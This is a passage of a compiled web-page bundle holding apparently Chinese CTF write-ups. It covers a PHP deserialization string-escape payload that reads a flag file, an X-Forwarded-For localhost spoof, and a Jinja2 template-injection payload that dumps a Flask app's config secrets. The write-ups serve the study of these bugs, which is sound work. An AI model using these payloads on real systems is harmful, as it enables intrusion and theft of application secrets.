\'guestflagflagflagflagflagflag\';\r\n$_SESSION[\'function\'] = \'";s:8:"function";s:2:"11";s:3:"img";s:20:"ZDBnM19mMWFnLnBocA==";}\';\r\n$_SESSION[\'img\'] = base64_encode(\'d0g3_f1ag.php\');\n'})}),"\n",(0,i.jsx)(e.p,{children:"\u5e8f\u5217\u5316\u7ed3\u679c"}),"\n",(0,i.jsx)(e.pre,{children:(0,i.jsx)(e.code,{children:'a:3:{s:4:"user";s:29:"guest";s:8:"function";s:65:"";s:8:"function";s:2:"11";s:3:"img";s:20:"ZDBnM19mMWFnLnBocA==";}";s:3:"img";s:20:"ZDBnM19mMWFnLnBocA==";}\n'})}),"\n",(0,i.jsxs)(e.p,{children:["\u5728user\u53d8\u91cf\u91cc\uff0c\u4f1a\u591a\u5403\u4e00\u4e2a",(0,i.jsx)(e.code,{children:'"'}),",\u5373",(0,i.jsx)(e.code,{children:'guest";s:8:"function";s:65:""'}),"\u8fd9\u6837\u624d\u662f29\u4e2a\u5b57\u7b26\uff0c\u6211\u4eec\u9700\u8981\u5728function\u53c2\u6570\u524d\u591a\u52a0\u4e00\u4e2a\u5b57\u7b26"]}),"\n",(0,i.jsx)(e.pre,{children:(0,i.jsx)(e.code,{children:'$_SESSION[\'function\'] = \'a";s:8:"function";s:2:"11";s:3:"img";s:20:"ZDBnM19mMWFnLnBocA==";}\';\n'})}),"\n",(0,i.jsx)(e.p,{children:"\u5e8f\u5217\u5316\u7ed3\u679c"}),"\n",(0,i.jsx)(e.pre,{children:(0,i.jsx)(e.code,{children:'a:3:{s:4:"user";s:29:"guest";s:8:"function";s:66:"a";s:8:"function";s:2:"11";s:3:"img";s:20:"ZDBnM19mMWFnLnBocA==";}";s:3:"img";s:20:"ZDBnM19mMWFnLnBocA==";}\n'})}),"\n",(0,i.jsx)(e.p,{children:"\u8fd9\u6837\u5c31\u90fd\u80fd\u88ab\u89e3\u6790\u4e86"}),"\n",(0,i.jsx)(e.p,{children:"payload"}),"\n",(0,i.jsx)(e.pre,{children:(0,i.jsx)(e.code,{children:'GET\u4f20\u53c2:\r\nf=show_image\r\nPOST\u4f20\u53c2:\r\n_SESSION[user]=guestflagflagflagflagflagflag&_SESSION[function]=a";s:8:"function";s:2:"11";s:3:"img";s:20:"L2QwZzNfZmxsbGxsbGFn";}\n'})}),"\n",(0,i.jsx)(e.p,{children:"d0g3_f1ag.php\u6587\u4ef6\u7684\u5185\u5bb9\u662f"}),"\n",(0,i.jsx)(e.pre,{children:(0,i.jsx)(e.code,{className:"language-php",children:"<?php\r\n\r\n$flag = 'flag in /d0g3_fllllllag';\r\n\r\n?>\n"})}),"\n",(0,i.jsx)(e.p,{children:"\u540c\u6837\u8bfb\u53d6/d0g3_fllllllag\u6587\u4ef6"}),"\n",(0,i.jsx)(e.pre,{children:(0,i.jsx)(e.code,{className:"language-php",children:"<?php\r\nfunction filter($img){\r\n    $filter_arr = array('php','flag','php5','php4','fl1g');\r\n    $filter = '/'.implode('|',$filter_arr).'/i';\r\n    return preg_replace($filter,'',$img);\r\n}\r\n\r\n$_SESSION[\"user\"] = 'guestflagflagflagflagflagflag';\r\n$_SESSION['function'] = 'a\";s:8:\"function\";s:2:\"11\";s:3:\"img\";s:20:\"L2QwZzNfZmxsbGxsbGFn\";}';\r\n$_SESSION['img'] = base64_encode('d0g3_f1ag.php');\r\n\r\n\r\n$serialize_info = filter(serialize($_SESSION));\r\necho $serialize_info;\n"})}),"\n",(0,i.jsx)(e.h2,{id:"mrctf2020pywebsite",children:"[MRCTF2020]PYWebsite"}),"\n",(0,i.jsx)(e.p,{children:"\u53d1\u73b0\u6e90\u7801\u91cc\u6709flag.php"}),"\n",(0,i.jsx)(e.p,{children:"\u8bbf\u95eeflag.php"}),"\n",(0,i.jsxs)(e.blockquote,{children:["\n",(0,i.jsx)(e.p,{children:"\u6211\u5df2\u7ecf\u628a\u8d2d\u4e70\u8005\u7684IP\u4fdd\u5b58\u4e86\uff0c\u663e\u7136\u4f60\u6ca1\u6709\u8d2d\u4e70"}),"\n",(0,i.jsx)(e.p,{children:"\u9a8c\u8bc1\u903b\u8f91\u662f\u5728\u540e\u7aef\u7684\uff0c\u9664\u4e86\u8d2d\u4e70\u8005\u548c\u6211\u81ea\u5df1\uff0c\u6ca1\u6709\u4eba\u53ef\u4ee5\u770b\u5230flag"}),"\n"]}),"\n",(0,i.jsx)(e.p,{children:"\u63d0\u793a\u548cip\u6709\u5173\uff0c\u6dfb\u52a0http\u5934\u8bd5\u8bd5"}),"\n",(0,i.jsx)(e.pre,{children:(0,i.jsx)(e.code,{children:"X-Forwarded-For: 127.0.0.1\n"})}),"\n",(0,i.jsx)(e.p,{children:"flag\u5c31\u51fa\u6765\u4e86"}),"\n",(0,i.jsx)(e.h2,{id:"westernctf2018shrine",children:"[WesternCTF2018]shrine"}),"\n",(0,i.jsx)(e.pre,{children:(0,i.jsx)(e.code,{className:"language-python",children:"import flask\r\nimport os\r\n\r\napp = flask.Flask(__name__)\r\n\r\napp.config['FLAG'] = os.environ.pop('FLAG')\r\n\r\n\r\n@app.route('/')\r\ndef index():\r\n    return open(__file__).read()\r\n\r\n\r\n@app.route('/shrine/<path:shrine>')\r\ndef shrine(shrine):\r\n\r\n    def safe_jinja(s):\r\n        s = s.replace('(', '').replace(')', '')\r\n        blacklist = ['config', 'self']\r\n        return ''.join(['{{% set {}=None%}}'.format(c) for c in blacklist]) + s\r\n\r\n    return flask.render_template_string(safe_jinja(shrine))\r\n\r\n\r\nif __name__ == '__main__':\r\n    app.run(debug=True)\n"})}),"\n",(0,i.jsx)(e.pre,{children:(0,i.jsx)(e.code,{children:"app.config['FLAG'] = os.environ.pop('FLAG')\r\n\u5728app\u7684config\u5185\u5b9a\u4e49\u4e86FLAG\u53c2\u6570\uff0c\u53c2\u6570\u7684\u503c\u4e3aos\u73af\u5883\u53d8\u91cf\u7684FLAG\u503c\uff0c\u8bfb\u53d6config\u5c31\u884c\u4e86\n"})}),"\n",(0,i.jsx)(e.p,{children:"payload"}),"\n",(0,i.jsx)(e.pre,{children:(0,i.jsx)(e.code,{children:"{{url_for.__globals__['current_app'].config}}\r\n{{get_flashed_messages.__globals__['current_app'].config}}\n"})})]})}function h(n={}){const{wrapper:e}={...(0,c.R)(),...n.components};return e?(0,i.jsx)(e,{...n,children:(0,i.jsx)(p,{...n})}):p(n)}}}]);